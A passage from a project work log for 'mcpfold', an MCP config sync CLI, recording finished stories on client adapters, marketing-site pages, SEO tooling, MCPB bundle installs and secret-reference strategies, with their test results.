  extensions + comments), **Codex CLI** (TOML `config.toml`, `[mcp_servers.*]`, honors `CODEX_HOME`;
  preserves other tables — comments not preserved, the honest TOML limit), **opencode** (JSON `mcp`
  key, `command` **array** + `environment`, XDG path even on Windows; comment-preserving jsonc edit).
- **Framework**: `render()` gained an optional `existing?: string` so shared-config adapters merge;
  `renderWithStrategy` + `sync` thread the on-disk contents through (read BEFORE render). Dedicated-
  file adapters ignore it. New deps `yaml` + `smol-toml` live in `packages/adapters` only — **core
  purity gate stays green** (`packages/core` still parser/I-O-free). `CLIENT_IDS` 12 → 18; JSON
  schema regenerated.
- **Evidence surfaces**: compat harness made format-aware (`shapeOf`/`containerOf` parse by
  `format: json|yaml|toml`); six new compat samples captured (all 18 compatible). `docs/coverage.md`
  matrix rows + per-client verified-July-2026 notes + shared-config `‡` footnote + wave-2 roadmap;
  site "supported clients" list + FAQ (12 → 18, YAML/TOML called out); `adapter_request.yml` refreshed
  (format + shared-file + updated root-key choices).

Tests: per-adapter suites for all six (per-OS paths, render→parse round-trip; merge + idempotency for
Goose/Codex/opencode), matrix goldens (18, incl. `goose.yaml` + `codex-cli.toml`), compat format-aware
tests, `detect-clients` wave-2 coverage, and a `runSync` integration test proving a Goose fold
preserves the user's non-MCP `config.yaml` keys/comments end-to-end.

`verify_all` green (eslint + core-purity, typecheck ×10, `pnpm -r test`, `pnpm -r build`, Prettier,
docs:build). Adapters 140 / core 92 / cli 251 pass. Pre-existing, unrelated red on Windows only:
`e2e/deploy-env.test.ts` (Git-Bash mangles the `scripts/gen-cloud-env.sh` path — fails identically on
a clean tree, passes on CI ubuntu).

**Follow-ups:** S19.4 (native-interpolation secrets) can replace the `shim` default for Goose
(`env_keys`), Continue (`${{ secrets }}`), and opencode variable substitution; S19.5 (compat harness
v2) can add live evidence + a public compat matrix for the YAML/TOML clients.

---

## S13.18 — Reusable email capture / waitlist component

**Started** 2026-07-10 · branch `story/S13.18-email-capture` · priority p3, deps: S13.1.

**Done** 2026-07-10.

Shipped a reusable, privacy-friendly email-capture form plus one wired sink — the deliverable, not a
full CRM.

- **`apps/site/src/subscribe/Subscribe.tsx`** — an accessible, reusable component (drop it anywhere
  with a `source`): labelled email input, consent copy ("we store only your email, unsubscribe
  anytime" + link to the security page for data handling), a **honeypot** (`website`) that skips the
  network entirely when filled, `aria-live` success/error states, and graceful degradation — a failed
  or unreachable sink shows a retry-able error and never throws. Posts to the sink (overridable via
  `VITE_SUBSCRIBE_URL`). Placed on the homepage; reusable on pricing/blog.
- **The sink** (`services/edge/functions/subscribe/index.ts`, wired into `src/server.ts`) — a public,
  unauthenticated edge endpoint that collects **no PII beyond the email**: a pure `parseSubscribe()`
  does honeypot + validation (unit-testable), the honeypot is silently absorbed (202, stores nothing),
  invalid emails 400, and valid ones insert into a new `newsletter_subscribers` table (`pending`
  status for a double-opt-in flow) `on conflict do nothing`. CORS + OPTIONS preflight for the
  cross-origin form.
- **Migration** `supabase/migrations/0008_newsletter_subscribers.sql` — the table, RLS-enabled with no
  policies (only the service connection writes; anon/authenticated get nothing). _(Numbered 0008 off
  `main`; renumber on merge if another 0008 lands first.)_

Tests: `services/edge/test/subscribe.test.ts` (5 DB-free Deno unit tests: honeypot/validation/
normalization, insert-on-valid, honeypot-stores-nothing, 400-on-invalid, OPTIONS/405) — all green
under `deno test`. `apps/site/test/subscribe.e2e.ts` (interactive dev-server Playwright, 4 tests):
a valid email posts to a **mocked** sink and shows success, an invalid email errors without a network
call, the form degrades gracefully on a 500, and the honeypot blocks a bot submission (no POST) — all
green. Site typecheck, build (prerender 9/9 with the form on the homepage), `deno check` + `deno lint`

- `deno fmt`, and repo-wide `format:check` all green.

**E13 (marketing site) is now complete** — S13.10, S13.11, S13.12, S13.14, S13.15, S13.16, S13.17,
S13.18 all shipped this run (each on its own branch off `main`), alongside the E15 SEO epic
(S15.5–S15.8).

## S15.5 — Per-client "add MCP servers to <client>" setup guides (pSEO + HowTo)

**Started** 2026-07-10 · branch `story/S15.5-per-client-guides` · priority p2, deps: S15.1, S13.4.

**Done** 2026-07-10.

Shipped a `/guides` hub plus one `/guides/<client>` setup guide for every supported client (18),
each targeting the highest-intent query cluster ("add MCP servers to Cursor", "claude code mcp", …)
with a copy-paste `mcpfold` walkthrough and HowTo structured data.

Config truth is **generated from the real adapters, never hand-duplicated**. A Node-only codegen
(`apps/site/scripts/gen-guides.mjs`) imports `ALL_ADAPTERS` from the built package and, using
synthetic per-OS `OsContext`s, resolves each client's user-scope config path (macOS/Windows/Linux)
plus its `secretStrategy`, `needsRestart`, and `remote` capability, emitting a committed, browser-safe
plain-data module `apps/site/src/guides/guides.data.ts`. This keeps `node:os`/`node:path` out of the
client bundle (the SEO modules that import the data are bundled for the browser) while the guide can
never drift from what `mcpfold sync` actually writes. A CI drift check (`guides:gen` + `git diff
--exit-code`, wired into the docs job) enforces it — the same pattern as demo/matrix drift.

- **`src/guides/guides.data.ts`** (generated) — the 18-client fact table (label, config root key,
  per-OS path, secret strategy, restart, remote), prettier-ignored as a generated artifact.
- **`src/guides/steps.ts`** — the canonical setup steps + neutral secret/remote notes, consumed by
  BOTH the visible page and the HowTo JSON-LD so the structured data mirrors the steps exactly.
- **`src/guides/ClientGuide.tsx`** — `GuidesIndex` (hub) + `GuidePage` (per-client): targeted H1,
  numbered steps with copy-paste command blocks, an adapter-derived "what mcpfold writes" facts panel,
  links to the directory + install, and explicit no-implied-endorsement copy per client.
- **Wiring** — routes in `App.tsx` (`/guides`, `/guides/:client`); `resolveMeta` + `allRoutes` +
  `jsonLdForPath` branches in `seo/meta.ts` / `seo/jsonld.ts` (HowTo + BreadcrumbList per guide,
  ItemList on the hub); `site-structure.ts` flips Guides from `planned` to live in nav + footer;
  homepage client list + Explore graph now link to the guides (list derived from the same data).

Guides land in the sitemap automatically (`allRoutes()` feeds both the prerender loop and
`sitemap.xml`). Build prerenders 111 routes (18 guides). New `test/guides.e2e.ts` (built-dist/no-JS
suite, added to the prerender Playwright config and ignored by the dev-server config) asserts the hub
ItemList, per-guide HowTo + breadcrumb, adapter-derived paths, the restart note, and sitemap
membership — 13/13 prerender tests pass. Site typecheck, repo-wide `format:check`, and the guides
drift check all green.

## S15.6 — Glossary / concept hub for topical authority

**Started** 2026-07-10 · branch `story/S15.6-glossary-concept-hub` · priority p2, deps: S15.1.

**Done** 2026-07-10.

Shipped a `/glossary` hub plus a concept page for each core term — MCP server, Model Context
Protocol, MCP client, MCP tools, context window, secret reference, and "MCP config manager" (the
category term to own). These are the informational head queries assistants answer from, so the pages
build topical authority and feed GEO citations while linking down into the product/directory/docs.

- **`src/glossary/terms.ts`** — the concept content as typed plain data: each term leads with a
  one-to-two-sentence **extractable** definition (`short`), a natural-language H1 question
  (`heading`), an expanded `body`, and internal `related` links. Neutral by construction — the
  Model Context Protocol is described factually with an explicit no-affiliation/endorsement note.
- **`src/glossary/Glossary.tsx`** — `GlossaryIndex` (definition-list hub) + `TermPage` (lifted
  definition blockquote, expanded body, related links, disclaimer).
- **Wiring** — routes in `App.tsx` (`/glossary`, `/glossary/:term`); `resolveMeta` + `allRoutes` +
  `jsonLdForPath` branches in `seo/meta.ts` / `seo/jsonld.ts` (a **DefinedTermSet** on the hub, a
  **DefinedTerm** + BreadcrumbList per concept page); `site-structure.ts` adds Glossary to the footer
  Resources group; the homepage Explore link graph now points at the glossary.

Chose a typed data module over `content/glossary/*` markdown (the files_hint) so the extractable
definition and schema stay first-class and browser-safe, mirroring how the directory ships as plain
`DIRECTORY` data. Concept pages land in the sitemap automatically via `allRoutes()`. Build prerenders
100 routes (7 glossary). New `test/glossary.e2e.ts` (built-dist/no-JS suite, added to the prerender
Playwright config and ignored by the dev-server config) asserts the hub DefinedTermSet, per-term
leading definition + DefinedTerm + breadcrumb, the category-term page, and sitemap membership —
13/13 prerender tests pass. Site typecheck and repo-wide `format:check` are green.

## S15.7 — Comparison / alternatives pages

**Started** 2026-07-10 · branch `story/S15.7-comparison-pages` · priority p2, deps: S15.1.

**Done** 2026-07-10.

Shipped a `/compare` hub plus two consideration-stage comparison pages: **"Managing MCP servers by
hand vs mcpfold"** (a 2-column head-to-head) and **"MCP config manager: where mcpfold fits"** (a
3-way By-hand / Hosted-gateway / mcpfold positioning table). These rank for modifier queries
("MCP config manager", "manually vs …") and give assistants a balanced source to cite.

Framing was written and reviewed against the PRD `meta.non_goals`:

- mcpfold is positioned as a **local-first CLI + curation tool, NOT a hosted enterprise gateway** —
  the pages state plainly that there is no server-side RBAC / org audit / hosted servers (that is the
  Composio/MintMCP space), and that those are complementary tools for a different job.
- Secret non-goal is explicit: only config with **references** is synced, **values are never synced**.
- Other tools are named only as a category with factual examples — no disparaging or unverifiable
  claims — and every page carries a no-affiliation/no-endorsement note.

- **`src/compare/comparisons.ts`** — the comparison content as typed plain data (N-column tables:
  columns + per-dimension cells, extractable intro, honest trade-off body, related links).
- **`src/compare/Compare.tsx`** — `CompareIndex` (hub) + `ComparePage` (semantic `<table>` with a
  row-header per dimension, intro, trade-off prose, related links, disclaimer).
- **Wiring** — routes in `App.tsx` (`/compare`, `/compare/:id`); `resolveMeta` + `allRoutes` +
  `jsonLdForPath` branches (an ItemList on the hub, a **TechArticle** + BreadcrumbList per page);
  `site-structure.ts` adds Compare to the footer Product group; the homepage Explore link graph
  points at `/compare`.

Pages land in the sitemap via `allRoutes()`; build prerenders 95 routes (2 compare). New
`test/compare.e2e.ts` (built-dist/no-JS suite, added to the prerender Playwright config and ignored
by the dev-server config) asserts the hub ItemList, the comparison table + TechArticle + breadcrumb,
the honest-positioning copy (local-first / "not a hosted gateway" / "values never synced"), and
sitemap membership — 13/13 prerender tests pass. Site typecheck and repo-wide `format:check` green.

## S15.8 — Technical SEO at scale + submission + rank/GEO measurement

**Started** 2026-07-10 · branch `story/S15.8-technical-seo-scale` · priority p2, deps: S15.1, S15.4.

**Done** 2026-07-10.

Turned the growing pSEO surface into something technically sound, submittable, and measured. All the
machinery operates generically over `allRoutes()`, so guides/glossary/compare (on their own branches)
flow through automatically once merged — no per-page-type wiring.

- **Sitemap at scale** — `gen-seo.mjs` now emits a **sitemap _index_** (`/sitemap.xml`) referencing
  typed child sitemaps (`sitemap-core/directory/categories/blog.xml`, and guides/glossary/compare when
  present), each with `<lastmod>`. Routes are bucketed by prefix. `robots.txt` points at the index.
- **Per-page OG images** — `gen-og.mjs` renders a templated 1200×630 SVG card per route from its own
  `<title>` (dependency-free), written to `dist/og/<route>.svg` and wired into that page's
  `og:image`/`twitter:image` — replacing the single shared `og.png`. (PNG rasterization at the edge is
  the one documented follow-up.)
- **Index-bloat + hygiene guard** — `seo-audit.mjs` (pure, `--self-test`ed) runs inside the build and
  **fails it** on any route missing a page-specific title/description/canonical, on duplicate
  canonicals, or on a keyword→page target that isn't a real route. Thin pages are already excluded by
  construction (allRoutes threshold).
- **Rank/GEO source of truth** — repurposed `src/seo/keyword-map.ts` into a typed keyword→page map
  (volume, intent, `geo` flag), validated against real routes at build time via the SSR bundle.
- **IndexNow** — `indexnow.mjs` walks the sitemap index → child sitemaps → page URLs, writes the
  key-ownership file, and POSTs to IndexNow on deploy; safe no-op without `INDEXNOW_KEY`, `--dry-run`
  previews the payload. Pure helpers (`locsFromXml`/`collectUrls`/`buildPayload`) are unit-exercised.
- **Docs** — `docs/seo-measurement.md`: the operating manual (build guards, sitemap, OG, IndexNow
  deploy wiring, GSC + Bing verification steps, weekly rank + GEO-citation cadence tied to S15.2).

Build prerenders 92 routes + 92 OG cards + a 4-typed-sitemap index. New `test/seo.e2e.ts`
(built-dist/no-JS, in the prerender Playwright config, ignored by the dev config) asserts the sitemap
index structure + typed children with lastmod, no duplicate URLs across sitemaps, per-page OG cards
wired into og:image, robots→index, and the IndexNow payload built from the real sitemap (mocked, no
network); an existing category-sitemap assertion was updated for the index structure — 14/14 prerender
tests pass. `seo:audit` self-test, `docs:build` (30 docs, links valid), site typecheck, and repo-wide
`format:check` all green.

## S13.10 — Feature deep-dive pages (the four pillars)

**Started** 2026-07-10 · branch `story/S13.10-feature-deep-dives` · priority p2, deps: S13.1, S13.8.

**Done** 2026-07-10.

Shipped a `/features` index plus a deep-dive page for each of the four pillars: **one config for
every client**, **tool curation** (cut the context tax), **secrets as references**, and
**sync/diff/drift control**. Each page has benefit-led copy, a concrete config/CLI example, links to
the deep docs, and cross-links to related features; the `Features` nav/footer link (previously
`planned`) is now live.

Every NUMBER comes from a committed source so the copy can't drift: the client count is
`CLIENT_IDS.length`, and the tool-curation figures (45 tools → 9, ~80% fewer tokens, 7,476 → 1,497)
are computed live from the same `benchmark/model` the homepage calculator uses. Format-trap prose
(`servers` vs `context_servers` vs `mcpServers` vs `extensions`) and secret-provider names state facts
already in docs/coverage.md and docs/secrets.md.

- **`src/features/features.ts`** — the four-pillar content as typed data; imports `compute` +
  `CLIENT_IDS` and bakes the committed numbers into the copy at load.
- **`src/features/FeaturePages.tsx`** — `FeaturesIndex` (card grid) + `FeaturePage` (tagline, body,
  example code block, deep-doc links, related-feature cross-links, install CTA). Named `FeaturePages`
  to avoid a case-collision with `features.ts` on case-insensitive filesystems.
- **Wiring** — routes in `App.tsx` (`/features`, `/features/:id`); `resolveMeta` + `allRoutes` +
  `jsonLdForPath` branches (an ItemList on the index, a **TechArticle** + BreadcrumbList per page);
  `site-structure.ts` flips Features to live in nav + footer Product; the homepage Explore graph links
  to `/features`.

Pages land in the sitemap via `allRoutes()`; build prerenders 97 routes (4 features). New
`test/features.e2e.ts` (built-dist/no-JS suite, in the prerender Playwright config, ignored by the
dev-server config) asserts the index ItemList, per-page H1 + example + doc/cross links + TechArticle +
breadcrumb, and — importantly — that the tool-curation numbers equal `compute(FIXTURE_SERVERS, 3)`
from the committed model (no drift), plus sitemap membership — 13/13 prerender tests pass. Site

## S13.11 — Use-case / persona pages

**Started** 2026-07-10 · branch `story/S13.11-persona-pages` · priority p2, deps: S13.1, S13.8.

**Done** 2026-07-10.

Shipped a `/use-cases` index plus a dedicated persona page for each of the three homepage teasers —
**solo developers**, **teams**, and **power users** — each reframing the same product around that
visitor's problem and routing to the right CTA: solo → install, teams → pricing, power users →
directory. The homepage persona teaser (`home/personas.ts`) now repoints each card to its
`/use-cases/<id>` page (the S13.8 comment predicted this).

The **teams** page carries the E12 team-without-cloud wedge — commit one reviewed `mcp.config.jsonc`,
everyone runs `mcpfold sync`, `mcpfold diff --check` as a CI drift gate — then the optional,
self-hostable cloud on top. Positioning stays within the PRD non-goals: it states plainly that
mcpfold is **not a hosted enterprise MCP gateway** and that the cloud syncs config with references but
**never secret values**.

- **`src/use-cases/use-cases.ts`** — the three personas as typed data (tagline, body, benefit
  highlights, primary/secondary CTA, cross-links). Ids match the homepage persona ids.
- **`src/use-cases/UseCasePages.tsx`** — `UseCasesIndex` (cards) + `UseCasePage` (tagline, body,
  highlight list, CTA button row, related-persona links). Named `UseCasePages` to avoid a
  case-collision with `use-cases.ts`.
- **Wiring** — routes in `App.tsx` (`/use-cases`, `/use-cases/:id`); `resolveMeta` + `allRoutes` +
  `jsonLdForPath` branches (an ItemList on the index, a BreadcrumbList per page); `site-structure.ts`
  adds Use cases to the footer Product group; the homepage teaser links in. On this branch only pages
  present on `main` are linked (no `/features` — that's on the S13.10 branch).

Build prerenders 96 routes (3 use-cases). New `test/use-cases.e2e.ts` (built-dist/no-JS suite, in the
prerender Playwright config, ignored by the dev-server config) asserts the index ItemList, per-persona
tailored copy + the correct CTA routing (solo→install, teams→pricing, power-users→directory), the team
non-goal copy ("not a hosted enterprise MCP gateway" / "never secret values"), that the homepage
teaser links resolve to the persona pages, and sitemap membership — 15/15 prerender tests pass. Site
typecheck and repo-wide `format:check` green.

## S13.12 — About / open-source project page

**Started** 2026-07-10 · branch `story/S13.12-about-page` · priority p2, deps: S13.1.

**Done** 2026-07-10.

Shipped `/about`: the mission (own one neutral `mcp.config.jsonc` format for every client; cut the
context tax; secrets as references), the open-source model with a clear license boundary (MIT
CLI/core free forever; the only commercial surface is the optional, self-hostable team cloud — which
syncs config with references, never secret values), and a "get involved" section linking GitHub,
CONTRIBUTING, governance, roadmap, and the adapter on-ramp (`mcpfold scaffold-adapter`). Restates the
no-implied-MCP-endorsement note.

- **`src/about/About.tsx`** — the page plus a `useGitHubSignals()` hook. **Live signals degrade
  gracefully**: the latest release comes from the build (`__APP_VERSION__`, the committed CLI
  version) so it is always in the prerendered HTML; the GitHub star and contributor counts are
  fetched client-side and simply omitted if the API is unavailable — no error, no layout shift
  (contributors count derives from the GitHub `Link` header's `rel="last"` page). Reuses the S13.8
  Credibility signal pattern.
- **Wiring** — route in `App.tsx`; `resolveMeta` + `allRoutes` branches; a JSON-LD **Organization**
  (with `sameAs` GitHub/npm) + BreadcrumbList on `/about`; `site-structure.ts` adds About to the
  footer Company group (server-rendered on every page).

Build prerenders /about into the SSG output. New `test/about.e2e.ts` (built-dist/no-JS suite, in the
prerender Playwright config, ignored by the dev-server config) asserts the mission + license boundary

- no-endorsement copy + the build-time release version + working GitHub/CONTRIBUTING/governance/
  roadmap/adapters links + Organization/breadcrumb schema in the no-JS HTML, sitemap + footer
  membership, and — with the GitHub API blocked via route interception — that the page still renders,
  the optional star/contributor signals are absent, and no app error is thrown. 12/12 prerender tests
  pass. Site typecheck and repo-wide `format:check` green.

## S13.14 — Legal & policy pages (privacy, terms, analytics disclosure)

**Started** 2026-07-10 · branch `story/S13.14-legal-policy-pages` · priority p2, deps: S13.1.

**Done** 2026-07-10.

Shipped `/privacy`, `/terms`, and `/analytics` (the analytics & cookie disclosure), each prerendered,
dated + versioned, and footer-linked from the Company group. All three live in ONE typed content
source (`src/legal/legal-content.ts`) so they are easy to update together.

The copy was written to match the **actual** implementation, not boilerplate — verified against
`src/analytics.ts`, `docs/telemetry.md`, and the secret-reference invariant:

- **Analytics**: cookieless, PII-free (Plausible/Umami-style), off unless built with the
  `VITE_ANALYTICS_*` env vars, and **no cookie wall** (stated as a deliberate choice).
- **CLI telemetry**: collects nothing by default; strictly opt-in (`MCPFOLD_TELEMETRY=1`), forced off
  by `DO_NOT_TRACK=1`; a fixed allow-list of non-identifying fields that passes the secret redactor.
- **Secrets**: the cloud syncs config with references — **never the secret values**, which stay local.
- **Terms**: the software is MIT-licensed (rights defined by the license), the hosted service is
  as-is, and the no-implied-MCP-endorsement note is restated.

Indexing is a **documented choice**: these are legitimate, low-competition pages with no thin-page
risk, so they are prerendered and left indexable (in the sitemap) rather than noindex.

- **`src/legal/LegalPage.tsx`** — renders any doc by id (`<LegalPage id="privacy" />`), with the
  effective date/version header and a cross-link footer.
- **Wiring** — routes in `App.tsx` (`/privacy`, `/terms`, `/analytics`); `resolveMeta` + `allRoutes`
  branches driven by `LEGAL_DOCS`; a BreadcrumbList per page in `jsonld.ts`; `site-structure.ts` adds
  Privacy / Terms / Analytics & cookies to the footer Company group.

Build prerenders the three pages. New `test/legal.e2e.ts` (built-dist/no-JS suite, in the prerender
Playwright config, ignored by the dev-server config) asserts each page renders dated + versioned, that
the privacy/analytics copy matches the real behavior (cookieless / `collects nothing by default` /
`MCPFOLD_TELEMETRY=1` / `DO_NOT_TRACK=1` / never secret values / no cookie wall), the MIT + as-is +
no-endorsement terms copy, footer links, sitemap membership, and a breadcrumb — 13/13 prerender tests

## S13.15 — Community & support page

**Started** 2026-07-10 · branch `story/S13.15-community-support` · priority p2, deps: S13.1.

**Done** 2026-07-10.

Shipped `/community`: one hub that routes every kind of engagement to the right channel, so support
friction drops and contributions get funneled.

- **Get help** → GitHub Discussions (the community forum) + search existing issues.
- **Request or add a client** → the `adapter_request.yml` issue template, the adapter docs, and
  CONTRIBUTING (adding a client is a one-PR job).
- **Report a bug** → guidance to run `mcpfold diagnose` (the real command, verified in the CLI) for a
  redaction-safe bundle with **secrets and personal paths stripped**, then file via the
  `bug_report.yml` template; cross-links the security page (how redaction works) and the CLI docs.
- **Stay in the loop** → blog, changelog, governance, sponsor. Restates the no-endorsement note and
  points to the security page for private vulnerability reports.

- **`src/community/Community.tsx`** — the page (channel cards + bug guidance + links).
- **Wiring** — route in `App.tsx`; `resolveMeta` + `allRoutes` branches; a BreadcrumbList in
  `jsonld.ts`; `site-structure.ts` adds Community & support to the footer Community group.

Build prerenders /community. New `test/community.e2e.ts` (built-dist/no-JS suite, in the prerender
Playwright config, ignored by the dev-server config) asserts the channels + `mcpfold diagnose`
guidance + all engagement links (Discussions/issues, the adapter-request + bug-report templates,
CONTRIBUTING, adapter/CLI docs) + no-endorsement copy + breadcrumb in the no-JS HTML, footer + sitemap
membership, and — via a filesystem check — that the two issue templates the page links to actually
exist in `.github/ISSUE_TEMPLATE/` (guards against a renamed/removed template). 12/12 prerender tests
pass. Site typecheck and repo-wide `format:check` green.

## S13.16 — Public roadmap page

**Started** 2026-07-10 · branch `story/S13.16-roadmap-page` · priority p3, deps: S13.1, S14.3.

**Done** 2026-07-10.

Shipped `/roadmap`, rendered from the **single source** `docs/roadmap.md` (S14.3) — no forked copy.
Following the existing `Changelog.tsx` precedent, the markdown is inlined at build via Vite `?raw` and
rendered with `marked`, so the page (and its status groups: Shipped / Next / Exploring) reflows
automatically whenever the one source file is edited — updating the roadmap is a one-file edit.

- **`src/roadmap/Roadmap.tsx`** — imports `../../../../docs/roadmap.md?raw`, parses it, and
  `rewriteDocLinks()` repoints the source's doc-relative links (`./telemetry.md`,
  `./coverage.md#…`) to the published docs (`/docs/telemetry.html`, …) so they resolve on the site.
  Reuses the blog `prose.css`.
- **Wiring** — route in `App.tsx`; `resolveMeta` + `allRoutes` branches; a BreadcrumbList in
  `jsonld.ts`; `site-structure.ts` adds Roadmap to the footer Resources group.

Build prerenders /roadmap. New `test/roadmap.e2e.ts` (built-dist/no-JS suite, in the prerender
Playwright config, ignored by the dev-server config) reads `docs/roadmap.md` from disk, extracts every
`## ` status-group heading, and asserts each appears in the rendered no-JS HTML — proving the page
renders the actual single source (a fork or a stale edit would fail) — plus that doc-relative `.md`
links are rewritten to `/docs/*.html`, the breadcrumb, and footer + sitemap membership. 12/12
prerender tests pass. Site typecheck and repo-wide `format:check` green.

## S13.17 — 404 / error pages, redirects, and brand/press kit

**Started** 2026-07-10 · branch `story/S13.17-error-brand-pages` · priority p3, deps: S13.1.

**Done** 2026-07-10.

Rounded out the site with a branded 404, a real redirect map, and a press kit.

- **Branded 404** — `src/pages/NotFound.tsx` (a catch-all `*` route) with helpful top links and jumps
  to the two search-y surfaces (directory + searchable docs). `gen-seo.mjs` renders it to
  `dist/404.html`, which Cloudflare Pages serves with a real **404 status** for unmatched paths. To
  enable that, `public/_redirects` drops the old blanket `/* /index.html 200` SPA fallback — every
  route is prerendered, so unmatched paths now fall through to `404.html` instead of masking bad URLs
  behind a 200 homepage. `serve-static.mjs` was updated to mirror this (serve `404.html` on a miss)
  so the behavior is testable.
- **Redirect map** — `public/_redirects` now carries a documented legacy/renamed-path map (301s:
  `/servers`→`/directory`, `/server/*`→`/directory/:splat`, `/download`→`/install`, …).
- **Brand / press kit** — `/brand` (`src/brand/Brand.tsx`, indexable): downloadable logomark +
  wordmark SVGs (new, in `public/brand/`) plus PNG/social fallbacks, the color tokens (from the design
  system, e.g. `#4c6ef5`), the product one-liner, and usage + explicit no-endorsement guidance.

- **Wiring** — routes in `App.tsx` (`/brand`, catch-all `*`); `resolveMeta` `/brand` + `/404` branches
  (`/brand` in `allRoutes`, `/404` deliberately not); a BreadcrumbList for `/brand` in `jsonld.ts`;
  `site-structure.ts` adds Brand & press kit to the footer Company group.

Build prerenders /brand and writes dist/404.html. New `test/notfound.e2e.ts` (built-dist/no-JS suite,
in the prerender Playwright config, ignored by the dev-server config) asserts an unknown URL returns
**404** with the branded page + helpful links, that /brand renders with downloadable assets (which
actually GET 200 as SVG), colors, one-liner, and no-endorsement copy, that /brand is in the
sitemap+footer while /404 is not, and that the `_redirects` legacy map ships without the old SPA
fallback — 13/13 prerender tests pass. Site typecheck and repo-wide `format:check` green.

## S17.8 — MCPB bundle support as an install source

Started/done: 2026-07-10. `mcpfold add --from-mcpb <file|url>` installs from an MCPB bundle (`.mcpb`,
renamed from DXT) — a ZIP whose root `manifest.json` declares a server. mcpfold parses it into a
**canonical, ref-only** stdio server; it does not extract or run the bundle (the MCP client's job) —
it maps, verifies, and surfaces. Format verified against modelcontextprotocol/mcpb MANIFEST.md v0.3 +
`src/node/sign.ts` (July 2026).

- **`registry/mcpb.ts`** (new): `parseMcpbManifest` (fflate unzip — tolerates the appended signature
  block), `mapMcpbManifest` (mcp_config → command/args/env with this OS's `platform_overrides`;
  `${user_config.KEY}` rewritten — `sensitive:true` → a `${keychain:…}` ref (or `--secret-scheme`),
  **never a value**; non-sensitive → its default; bundle runtime vars `${__dirname}`/`${HOME}` left
  verbatim + flagged), `inspectMcpbSignature` (reads the `MCPB_SIG_V1 <len> DER MCPB_SIG_END` block →
  **unsigned / self-signed (issuer CN == subject CN) / signed**, surfacing publisher+issuer via
  node-forge), and `verifyMcpbIntegrity` (whole-file SHA-256 vs a registry `fileSha256`, hex or SRI).
  An unsupported `server.type` fails with a clear list of what's supported.
- **`add.ts`**: `--from-mcpb` + `--integrity <sha256>` wired; the name is derived from the manifest;
  the signature status + mapping warnings are surfaced in the output; a bad integrity hash refuses
  the install before touching the config. New deps `fflate` + `node-forge` (CLI only).

Tests: `mcpb.test.ts` (12) — mapping (keychain ref, platform override, chosen scheme, runtime-var
warning, unsupported-type error), parse-from-real-ZIP, signature (unsigned/self-signed/signed via a
node-forge-signed fixture), integrity match/mismatch, and a `runAdd --from-mcpb` integration (ref-only
server added, signature surfaced, integrity refusal). `docs/registry.md` documents the flow; the
shell-completion snapshot picked up the two new flags.

`verify_all` green (eslint + core-purity, typecheck ×10, `pnpm -r test`, `pnpm -r build`, Prettier,
docs:build; demo unchanged). CLI 263 tests pass. Same pre-existing Windows-only red
(`e2e/deploy-env.test.ts`; passes on CI ubuntu).

**Follow-ups:** full OS-trust-store chain validation for "signed" (we classify self-signed vs
CA-issued and surface the signer; we don't execute the bundle, so we don't gate on a trusted chain);
`user_config` `multiple:true` array expansion into repeated args (single-value substitution ships).

## S19.3 — Project-scope expansion & installed-app detection

Started/done: 2026-07-09. Two audit gaps closed: (1) clients that support a project-scoped MCP
config now fold to it, and (2) `detect-clients` sees clients that are **installed but not yet
configured**, not just already-configured ones. Both parts verified against current primary docs
(two parallel research passes; sources in `docs/coverage.md`). Stacked on S19.2 (needs the 18-client
matrix).

**Project scope.** Re-verified all scope-throwing adapters against July-2026 docs:

- **Zed** and **Gemini CLI** DO support project scope → implemented (`<project>/.zed/settings.json`
  with `context_servers`; `<project>/.gemini/settings.json` with `mcpServers`). Gemini's `render`
  no longer hard-codes the user path — it honors `servers[0].scope/projectPath` like the others.
- **Claude Desktop, Windsurf, Cline** confirmed **global-only** → they (and the wave-2 user-only
  clients LM Studio / Goose / Codex CLI / Copilot CLI) now **throw** on a project/workspace profile
  instead of silently misdirecting it to the shared user file (Windsurf/Zed previously ignored scope
  entirely). The "throws on project" list shrinks by Zed + Gemini; the rest is now honest + verified.

**Installed-app detection.** New injectable `install-probes.ts` gives per-client, per-OS presence
signals — a CLI on PATH, an app bundle / install dir, a VS Code-family extension folder
(`<host>/extensions/<publisher.id>-*`), or the durable dot-dir a client writes on first run.
`detect-clients` now returns a three-way `state` (`configured` / `installed-only` / `not-found`)
plus `appPresent`, keeping the legacy `installed` field (== `configured`) so `--json` consumers are
unbroken (strictly additive). `DetectProbe` is injected, so every state is unit-tested per platform
with zero real I/O.

- `init --guided` lists installed-only clients and offers them as fold targets.
- `init` and `doctor` print "installed but not configured"; `status` adds an `installedUnconfigured`
  field + a hint line for installed clients with no profile yet.

Tests: `detect-clients.test.ts` (three states via fake probes: bin-on-PATH, extension-dir,
config-file, configured-wins-over-installed); project-scope resolve + render for Zed and Gemini CLI;
throw-on-project for the user-only clients (Goose, LM Studio); a guided test that surfaces an
installed-only client (`~/.gemini` present, no config); `status` `--json` shape updated for the
additive field.

`verify_all` green (eslint + core-purity, typecheck ×10, `pnpm -r test`, `pnpm -r build`, Prettier,
docs:build). adapters 142 / core 92 / cli 257. Same pre-existing Windows-only red as S19.2
(`e2e/deploy-env.test.ts` — Git-Bash path mangling; passes on CI ubuntu).

**Follow-ups:** the install-probe locations are a living table (like the format matrix) — refresh as
apps move; JetBrains/Visual Studio presence is detected at the family level (any JetBrains IDE / any
VS install), not per-product.

---

## S19.4 — Native-interpolation secret strategy (`native-env`)

Started/done: 2026-07-09. For a plain `${env:NAME}` ref, the `mcpfold run` shim adds a wrapper
process for nothing — many clients expand env placeholders in their own config. `native-env` writes
the client's OWN dialect instead, so the client resolves the var at launch and mcpfold stays out of
the path. The value is never written — only the placeholder name — so the leak harness stays green by
construction. Stacked on S19.3. Per-client dialects verified against primary docs (one research pass;
sources in `docs/coverage.md`/`docs/secrets.md`).

- **Capability**: adapters declare an `envInterpolation(name)` dialect; 7 clients support it (verified
  July 2026): Cursor/Windsurf `${env:NAME}`, Claude Code/Gemini/Warp/Copilot CLI `${NAME}`, opencode
  single-brace `{env:NAME}`. VS Code keeps `native-input`; Claude Desktop/Zed/JetBrains/Cline/Codex
  CLI/LM Studio/Goose(stdio) have no env interpolation → stay shim.
- **Opt-in, no silent change**: the default stays each adapter's own strategy (shim). A profile or
  server opts in via a new `secretStrategy: "shim" | "native-env"` field (server override wins over
  profile). Core `SECRET_STRATEGIES`/`STRATEGY_OVERRIDES` + `ResolvedServer.secretStrategy`;
  `resolveProfile` threads server→profile precedence; `renderWithStrategy` applies it per server.
- **Automatic shim fallback**: a native-env server with a NON-env scheme (infisical/keychain/op/
  dotenv) can't be resolved by the client, so it folds via the shim — `doctor` emits an `info`
